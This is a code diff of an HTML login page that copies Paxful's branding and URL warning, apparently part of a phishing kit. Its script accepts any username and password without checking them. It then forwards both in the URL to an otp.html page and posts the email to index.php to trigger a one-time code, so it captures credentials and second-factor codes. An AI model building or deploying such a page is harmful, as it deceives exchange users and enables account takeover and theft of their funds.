@@ -1,301 +1,377 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Log In With Paxful</title>
-    <link rel="stylesheet" href="css/style.css">
-</head>
+    <link rel="stylesheet" href="css/style.css" />
+  </head>
 
-<body>
+  <body>
     <div id="root" class="row">
-        <div class="column">
-            <div class="content">
-                <div class="header">
-                    <!-- Logo and title -->
-                    <img src="images/logo.png" alt="Paxful Logo" class="logo">
+      <div class="column">
+        <div class="content">
+          <div class="header">
+            <!-- Logo and title -->
+            <img src="./Images/logo.png" alt="Paxful Logo" class="logo" />
 
-                    <!-- Language dropdown -->
-                    <div class="language-dropdown">
-                        <button type="button" aria-haspopup="true" aria-expanded="false"
-                            class="d-flex align-items-center w-100 px-2 justify-content-between btn btn-light"
-                            style="background-color:transparent; 
-            border: 1px solid #d8d8d8; color: black;  align-content: center; height: 40px;">
-
-                            <img style="width:20px; height: auto; position: 5px center; " src="images/global.png">
-                            English
-                            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"
-                                class="ml-2 LanguageSelector__icon text-gray-500">
-                                <path
-                                    d="M8 12.586L2.707 7.293a1 1 0 011.414-1.414L8 10.172l4.879-4.879a1 1 0 111.414 1.414L8 12.586z" />
-                            </svg>
-
-                        </button>
-                    </div>
-                </div>
-
-                <h1 style="color: navy;">Log in with Paxful</h1>
-
-                <div class="login-container">
-                    <form>
-                        <div class="alert alert-custom d-flex align-items-start font-weight-semibold regular-18 lh-16 mb-3 mb-xs-4">
-                            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"
-                                class="mr-2_5 icon">
-                                <path fill-rule="evenodd"
-                                    d="M8 2a6 6 0 100 12A6 6 0 008 2zM0 8a8 8 0 1116 0A8 8 0 010 8zm9-3a1 1 0 11-2 0 1 1 0 012 0zM8 7a1 1 0 00-1 1v3a1 1 0 102 0V8a1 1 0 00-1-1z"
-                                    clip-rule="evenodd"></path>
-                            </svg>
-                            <div class="d-flex flex-column flex-xs-row">
-                                <p>IMPORTANT! Please check </p>
-                                <div class="lock-content">
-                                    <img class="lock-icon" src="images/lock.png" alt="url">
-                                    https://accounts.paxful.com
-                                </div>
-                                <p>that you are visiting </p>
-                                <p>https://accounts.paxful.com/</p>
-
-                            </div>
-                        </div>
-
-                        <div class="label-input-group">
-                            <label for="loginUsername">Your Phone or Email</label>
-                            <input id="loginUsername" type="text" required=""
-                                onfocus="removeError('loginUsername')"
-                                onblur="validateInput('loginUsername')">
-                           <div id="usernameError" class="error-message"></div>
-                            <div id="emailError" class="error-message"></div>
-                         </div>
-                        <div class="label-input-group">
-
-                            <p>
-                                <a style="float: right;" href="https://accounts.paxful.com/password/reset">Forgot
-                                    password?</a> <label for="loginPassword">Your Password</label>
-                            </p>
-
-                            <div class="password-container">
-                                <input id="loginPassword" type="password" required onblur="" 
-                                    onfocus="removeError('loginPassword')"
-                                    onblur="validateInput('loginPassword')">
-                                <div id="passwordError" class="error-message"></div>
-                                <button type="button"
-                                    class="text-gray-600 btn-square btn btn-transparent btn-md"
-                                    style="background-color: transparent; color: black; border: none; margin:7px;" onclick="togglePasswordVisibility()">
-                                    <svg id="passwordIcon" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"
-                                        class="d-block">
-                                        <path fill-rule="evenodd"
-                                            d="M2.03 8.006L2.027 8l.003-.006a2.35 2.35 0 01.287-.41c.288-.344.73-.753 1.3-1.145C4.762 5.65 6.318 5 8 5c1.68 0 3.235.656 4.381 1.448a6.704 6.704 0 011.303 1.148c.142.17.234.307.285.404a2.465 2.465 0 01-.285.404 6.704 6.704 0 01-1.303 1.148C11.235 10.344 9.68 11 8 11c-1.682 0-3.238-.65-4.383-1.439-.57-.392-1.012-.8-1.3-1.144a2.397 2.397 0 01-.287-.41zM8 3c-2.184 0-4.128.836-5.517 1.79-.696.48-1.279 1.007-1.7 1.51a4.29 4.29 0 00-.528.772C.128 7.317 0 7.642 0 8c0 .358.128.683.255.928.135.26.318.522.528.772.421.503 1.004 1.03 1.7 1.51C3.872 12.163 5.816 13 8 13c2.186 0 4.131-.844 5.518-1.802.696-.48 1.278-1.008 1.698-1.508.21-.25.392-.508.527-.766.126-.24.257-.565.257-.924 0-.359-.13-.684-.257-.924a4.385 4.385 0 00-.527-.766c-.42-.5-1.002-1.027-1.698-1.508C12.131 3.844 10.186 3 8 3zm0 7a2 2 0 100-4 2 2 0 000 4z"
-                                            clip-rule="evenodd"></path>
-                                    </svg>
-                                </button>
-                            </div>
-                        </div>
-
-                        <div id="successMessage" class="successMessage" style="display: none;"></div>
-                        <div id="errorMessage" class="errorMessage" style="display: none;"></div>  
-                        <button type="submit" style="display: flex; align-items: center; justify-content: space-between;" onclick="sendOTP()">
-                            Log in
-                            <p style="margin: 0;">&gt;</p>
-                        </button>
-                        <div id="loader" style="display: none;">
-                            <p>Loading...</p>
-                        </div>
-
-                        <br>
-                        <div>
-                            <hr style="background-color: lightgray">
-                        </div>
-                        <br>
-                        <p>
-                            New on Paxful? <a href="https://paxful.com/register?locale=en">Create an Account</a>
-                        </p>
-                    </form>
-                </div>
+            <!-- Language dropdown -->
+            <div class="language-dropdown">
+              <button
+                type="button"
+                aria-haspopup="true"
+                aria-expanded="false"
+                class="d-flex align-items-center w-100 px-2 justify-content-between btn btn-light"
+                style="
+                  background-color: transparent;
+                  border: 1px solid #d8d8d8;
+                  color: black;
+                  align-content: center;
+                  height: 40px;
+                "
+              >
+                <img
+                  style="width: 20px; height: auto; position: 5px center"
+                  src="./Images/global.png"
+                />
+                English
+                <svg
+                  width="16"
+                  height="16"
+                  viewBox="0 0 16 16"
+                  fill="currentColor"
+                  class="ml-2 LanguageSelector__icon text-gray-500"
+                >
+                  <path
+                    d="M8 12.586L2.707 7.293a1 1 0 011.414-1.414L8 10.172l4.879-4.879a1 1 0 111.414 1.414L8 12.586z"
+                  />
+                </svg>
+              </button>
             </div>
-        </div>
-        <div class="column" style="width:70%; image-orientation: streach;">
-            <div class="photo-container" style=" 
-    background: url('images/firstbackground.png') center/cover;">
+          </div>
 
-            </div>
+          <h1 style="color: navy">Log in with Paxful</h1>
+
+          <div class="login-container">
+            <form>
+              <div
+                class="alert alert-custom d-flex align-items-start font-weight-semibold regular-18 lh-16 mb-3 mb-xs-4"
+              >
+                <svg
+                  width="16"
+                  height="16"
+                  viewBox="0 0 16 16"
+                  fill="currentColor"
+                  class="mr-2_5 icon"
+                >
+                  <path
+                    fill-rule="evenodd"
+                    d="M8 2a6 6 0 100 12A6 6 0 008 2zM0 8a8 8 0 1116 0A8 8 0 010 8zm9-3a1 1 0 11-2 0 1 1 0 012 0zM8 7a1 1 0 00-1 1v3a1 1 0 102 0V8a1 1 0 00-1-1z"
+                    clip-rule="evenodd"
+                  ></path>
+                </svg>
+                <div class="d-flex flex-column flex-xs-row">
+                  <p>IMPORTANT! Please check</p>
+                  <div class="lock-content">
+                    <img class="lock-icon" src="./Images//lock.png" alt="url" />
+                    https://accounts.paxful.com
+                  </div>
+                  <p>that you are visiting</p>
+                  <p>https://accounts.paxful.com/</p>
+                </div>
+              </div>
+
+              <div class="label-input-group">
+                <label for="loginUsername">Your Phone or Email</label>
+                <input
+                  id="loginUsername"
+                  type="text"
+                  required=""
+                  onfocus="removeError('loginUsername')"
+                  onblur="validateInput('loginUsername')"
+                />
+                <div id="usernameError" class="error-message"></div>
+                <div id="emailError" class="error-message"></div>
+              </div>
+              <div class="label-input-group">
+                <p>
+                  <a
+                    style="float: right"
+                    href="https://accounts.paxful.com/password/reset"
+                    >Forgot password?</a
+                  >
+                  <label for="loginPassword">Your Password</label>
+                </p>
+
+                <div class="password-container">
+                  <input
+                    id="loginPassword"
+                    type="password"
+                    required
+                    onblur=""
+                    onfocus="removeError('loginPassword')"
+                    onblur="validateInput('loginPassword')"
+                  />
+                  <div id="passwordError" class="error-message"></div>
+                  <button
+                    type="button"
+                    class="text-gray-600 btn-square btn btn-transparent btn-md"
+                    style="
+                      background-color: transparent;
+                      color: black;
+                      border: none;
+                      margin: 7px;
+                    "
+                    onclick="togglePasswordVisibility()"
+                  >
+                    <svg
+                      id="passwordIcon"
+                      width="16"
+                      height="16"
+                      viewBox="0 0 16 16"
+                      fill="currentColor"
+                      class="d-block"
+                    >
+                      <path
+                        fill-rule="evenodd"
+                        d="M2.03 8.006L2.027 8l.003-.006a2.35 2.35 0 01.287-.41c.288-.344.73-.753 1.3-1.145C4.762 5.65 6.318 5 8 5c1.68 0 3.235.656 4.381 1.448a6.704 6.704 0 011.303 1.148c.142.17.234.307.285.404a2.465 2.465 0 01-.285.404 6.704 6.704 0 01-1.303 1.148C11.235 10.344 9.68 11 8 11c-1.682 0-3.238-.65-4.383-1.439-.57-.392-1.012-.8-1.3-1.144a2.397 2.397 0 01-.287-.41zM8 3c-2.184 0-4.128.836-5.517 1.79-.696.48-1.279 1.007-1.7 1.51a4.29 4.29 0 00-.528.772C.128 7.317 0 7.642 0 8c0 .358.128.683.255.928.135.26.318.522.528.772.421.503 1.004 1.03 1.7 1.51C3.872 12.163 5.816 13 8 13c2.186 0 4.131-.844 5.518-1.802.696-.48 1.278-1.008 1.698-1.508.21-.25.392-.508.527-.766.126-.24.257-.565.257-.924 0-.359-.13-.684-.257-.924a4.385 4.385 0 00-.527-.766c-.42-.5-1.002-1.027-1.698-1.508C12.131 3.844 10.186 3 8 3zm0 7a2 2 0 100-4 2 2 0 000 4z"
+                        clip-rule="evenodd"
+                      ></path>
+                    </svg>
+                  </button>
+                </div>
+              </div>
+
+              <div
+                id="successMessage"
+                class="successMessage"
+                style="display: none"
+              ></div>
+              <div
+                id="errorMessage"
+                class="errorMessage"
+                style="display: none"
+              ></div>
+              <button
+                type="submit"
+                style="
+                  display: flex;
+                  align-items: center;
+                  justify-content: space-between;
+                "
+                onclick="sendOTP()"
+              >
+                Log in
+                <p style="margin: 0">&gt;</p>
+              </button>
+              <div id="loader" style="display: none">
+                <p>Loading...</p>
+              </div>
+
+              <br />
+              <div>
+                <hr style="background-color: lightgray" />
+              </div>
+              <br />
+              <p>
+                New on Paxful?
+                <a href="https://paxful.com/register?locale=en"
+                  >Create an Account</a
+                >
+              </p>
+            </form>
+          </div>
         </div>
+      </div>
+      <div class="column" style="width: 70%; image-orientation: streach">
+        <div
+          class="photo-container"
+          style="background: url('./Images/firstBackground.png') no-repeat center center; background-size: cover;"
+        ></div>
+      </div>
     </div>
 
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const loginForm = document.querySelector("form");
+        const loginButton = document.querySelector('button[type="submit"]');
+        const loader = document.getElementById("loader");
+        const errorMessageDiv = document.getElementById("errorMessage");
+        const successMessageDiv = document.getElementById("successMessage");
 
-<script>
-   document.addEventListener('DOMContentLoaded', function () {
-    const loginForm = document.querySelector('form');
-    const loginButton = document.querySelector('button[type="submit"]');
-    const loader = document.getElementById('loader');
-    const errorMessageDiv = document.getElementById('errorMessage');
-    const successMessageDiv = document.getElementById('successMessage');
+        loginForm.addEventListener("submit", function (event) {
+          // Prevent the default form submission
+          event.preventDefault();
 
-    loginForm.addEventListener('submit', function (event) {
-        // Prevent the default form submission
-        event.preventDefault();
+          // Your authentication logic goes here
+          const username = document.getElementById("loginUsername").value;
+          const password = document.getElementById("loginPassword").value;
 
-        // Your authentication logic goes here
-        const username = document.getElementById('loginUsername').value;
-        const password = document.getElementById('loginPassword').value;
+          // Show loader and disable login button
+          showLoader();
 
-        // Show loader and disable login button
-        showLoader();
+          // Mock authentication (replace this with your actual authentication logic)
+          const isAuthenticated = authenticateUser(username, password);
 
-        // Mock authentication (replace this with your actual authentication logic)
-        const isAuthenticated = authenticateUser(username, password);
-
-        setTimeout(function () {
+          setTimeout(function () {
             // Hide loader after 5 seconds (5000 milliseconds)
             hideLoader();
 
             if (isAuthenticated) {
-                // Your logic after authentication succeeds
-                successMessageDiv.textContent = 'Login successful!';
-                successMessageDiv.style.display='block';
-                window.location.href = `otp.html?email=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
-                        
+              // Your logic after authentication succeeds
+              successMessageDiv.textContent = "Login successful!";
+              successMessageDiv.style.display = "block";
+              window.location.href = `otp.html?email=${encodeURIComponent(
+                username
+              )}&password=${encodeURIComponent(password)}`;
 
-                setTimeout(function () {
-                    // Hide success message after 3 seconds (3000 milliseconds)
-                    successMessageDiv.textContent = '';
-                    successMessageDiv.style.display='block'
-        window.location.href = 'otp.html';                    
-                }, 3000);
+              setTimeout(function () {
+                // Hide success message after 3 seconds (3000 milliseconds)
+                successMessageDiv.textContent = "";
+                successMessageDiv.style.display = "block";
+                window.location.href = "otp.html";
+              }, 3000);
             } else {
-                // Show error message above the login button
-                errorMessageDiv.textContent = 'Invalid credentials. Please try again.';
-                errorMessageDiv.style.display='block'
-                setTimeout(function () {
-                    // Hide error message after 3 seconds (3000 milliseconds)
-                    errorMessageDiv.textContent = '';
-                    errorMessageDiv.style.display='none'
-                }, 3000);
+              // Show error message above the login button
+              errorMessageDiv.textContent =
+                "Invalid credentials. Please try again.";
+              errorMessageDiv.style.display = "block";
+              setTimeout(function () {
+                // Hide error message after 3 seconds (3000 milliseconds)
+                errorMessageDiv.textContent = "";
+                errorMessageDiv.style.display = "none";
+              }, 3000);
             }
-        }, 5000);
-    });
+          }, 5000);
+        });
 
-   function authenticateUser(username, password) {
-    // Replace this with your actual authentication logic
-    // For example, you can make an AJAX request to your server for authentication
-    // Remove the hard-coded check
-    return true; // Always return true as we are not checking username and password here
-}
-
-
-    function showLoader() {
-        loader.style.display = 'block'; // Show the loader
-        loginButton.style.display = 'none'; // Hide the login button
-    }
-
-    function hideLoader() {
-        loader.style.display = 'none'; // Hide the loader
-        loginButton.style.display = 'flex'; // Show the login button
-    }
-
-    // Adding event listeners for input validation
-    document.getElementById('loginUsername').addEventListener('blur', function () {
-        validateInput('loginUsername');
-    });
-    document.getElementById('loginPassword').addEventListener('blur', function () {
-        validateInput('loginPassword');
-    });
-
-    document.getElementById('loginUsername').addEventListener('focus', function () {
-        removeError('loginUsername');
-        // Clear the error and success messages on focus
-        errorMessageDiv.textContent = '';
-        successMessageDiv.textContent = '';
-    });
-    document.getElementById('loginPassword').addEventListener('focus', function () {
-        removeError('loginPassword');
-        // Clear the error and success messages on focus
-        errorMessageDiv.textContent = '';
-        successMessageDiv.textContent = '';
-    });
-});
-
-
-
-function removeError(inputId) {
-    const input = document.getElementById(inputId);
-    const errorDiv = document.getElementById(inputId + 'Error');
-
-    // Remove error message and border color
-    errorDiv.textContent = '';
-    input.classList.remove('error-border');
-}
-
-function togglePasswordVisibility() {
-    const passwordInput = document.getElementById('loginPassword');
-    const passwordIcon = document.getElementById('passwordIcon');
-
-    // Toggle the password visibility
-    passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
-
-    // Change the color of the SVG icon based on password visibility
-    if (passwordInput.type === 'password') {
-        passwordIcon.style.fill = 'currentColor';
-    } else {
-        // Change the color to red when showing the password
-        passwordIcon.style.fill = 'red';
-    }
-}
-
-
-    function validateInput(inputId) {
-    const input = document.getElementById(inputId);
-    const errorDiv = document.getElementById(inputId + 'Error');
-
-    if (inputId === 'loginUsername') {
-        const email = input.value.trim();
-
-        if (email === '') {
-            errorDiv.textContent = 'This field is required.';
-            input.classList.add('error-border');
-        } else if (!validateEmail(email)) {
-            errorDiv.textContent = 'Invalid email format.';
-            input.classList.add('error-border');
-        } else {
-            errorDiv.textContent = ''; // Clear the error message
-            input.classList.remove('error-border');
+        function authenticateUser(username, password) {
+          // Replace this with your actual authentication logic
+          // For example, you can make an AJAX request to your server for authentication
+          // Remove the hard-coded check
+          return true; // Always return true as we are not checking username and password here
         }
-    }
-}
 
-function sendOTP() {
-    const email = document.getElementById('loginUsername').value;
-
-    // Validate email format (you might want to use a more robust validation)
-    if (!validateEmail(email)) {
-        alert('Invalid email format');
-        return;
-    }
-
-    // Make an AJAX request to sendOTP.php
-    const xhr = new XMLHttpRequest();
-    xhr.open('POST', 'index.php', true);
-    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-
-    xhr.onload = function () {
-        const response = JSON.parse(xhr.responseText);
-        if (response.status === 'success') {
-            alert('OTP sent successfully');
-        } else {
-            alert('Failed to send OTP');
+        function showLoader() {
+          loader.style.display = "block"; // Show the loader
+          loginButton.style.display = "none"; // Hide the login button
         }
-    };
 
-    // Send the email as the only parameter
-    xhr.send('email=' + encodeURIComponent(email));
-}
+        function hideLoader() {
+          loader.style.display = "none"; // Hide the loader
+          loginButton.style.display = "flex"; // Show the login button
+        }
 
+        // Adding event listeners for input validation
+        document
+          .getElementById("loginUsername")
+          .addEventListener("blur", function () {
+            validateInput("loginUsername");
+          });
+        document
+          .getElementById("loginPassword")
+          .addEventListener("blur", function () {
+            validateInput("loginPassword");
+          });
 
-function validateEmail(email) {
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return emailRegex.test(email);
-}
+        document
+          .getElementById("loginUsername")
+          .addEventListener("focus", function () {
+            removeError("loginUsername");
+            // Clear the error and success messages on focus
+            errorMessageDiv.textContent = "";
+            successMessageDiv.textContent = "";
+          });
+        document
+          .getElementById("loginPassword")
+          .addEventListener("focus", function () {
+            removeError("loginPassword");
+            // Clear the error and success messages on focus
+            errorMessageDiv.textContent = "";
+            successMessageDiv.textContent = "";
+          });
+      });
 
-</script>
-</body>
+      function removeError(inputId) {
+        const input = document.getElementById(inputId);
+        const errorDiv = document.getElementById(inputId + "Error");
 
+        // Remove error message and border color
+        errorDiv.textContent = "";
+        input.classList.remove("error-border");
+      }
+
+      function togglePasswordVisibility() {
+        const passwordInput = document.getElementById("loginPassword");
+        const passwordIcon = document.getElementById("passwordIcon");
+
+        // Toggle the password visibility
+        passwordInput.type =
+          passwordInput.type === "password" ? "text" : "password";
+
+        // Change the color of the SVG icon based on password visibility
+        if (passwordInput.type === "password") {
+          passwordIcon.style.fill = "currentColor";
+        } else {
+          // Change the color to red when showing the password
+          passwordIcon.style.fill = "red";
+        }
+      }
+
+      function validateInput(inputId) {
+        const input = document.getElementById(inputId);
+        const errorDiv = document.getElementById(inputId + "Error");
+
+        if (inputId === "loginUsername") {
+          const email = input.value.trim();
+
+          if (email === "") {
+            errorDiv.textContent = "This field is required.";
+            input.classList.add("error-border");
+          } else if (!validateEmail(email)) {
+            errorDiv.textContent = "Invalid email format.";
+            input.classList.add("error-border");
+          } else {
+            errorDiv.textContent = ""; // Clear the error message
+            input.classList.remove("error-border");
+          }
+        }
+      }
+
+      function sendOTP() {
+        const email = document.getElementById("loginUsername").value;
+
+        // Validate email format (you might want to use a more robust validation)
+        if (!validateEmail(email)) {
+          alert("Invalid email format");
+          return;
+        }
+
+        // Make an AJAX request to sendOTP.php
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", "index.php", true);
+        xhr.setRequestHeader(
+          "Content-Type",
+          "application/x-www-form-urlencoded"
+        );
+
+        xhr.onload = function () {
+          const response = JSON.parse(xhr.responseText);
+          if (response.status === "success") {
+            alert("OTP sent successfully");
+          } else {
+            alert("Failed to send OTP");
+          }
+        };
+
+        // Send the email as the only parameter
+        xhr.send("email=" + encodeURIComponent(email));
+      }
+
+      function validateEmail(email) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return emailRegex.test(email);
+      }
+    </script>
+  </body>
 </html>
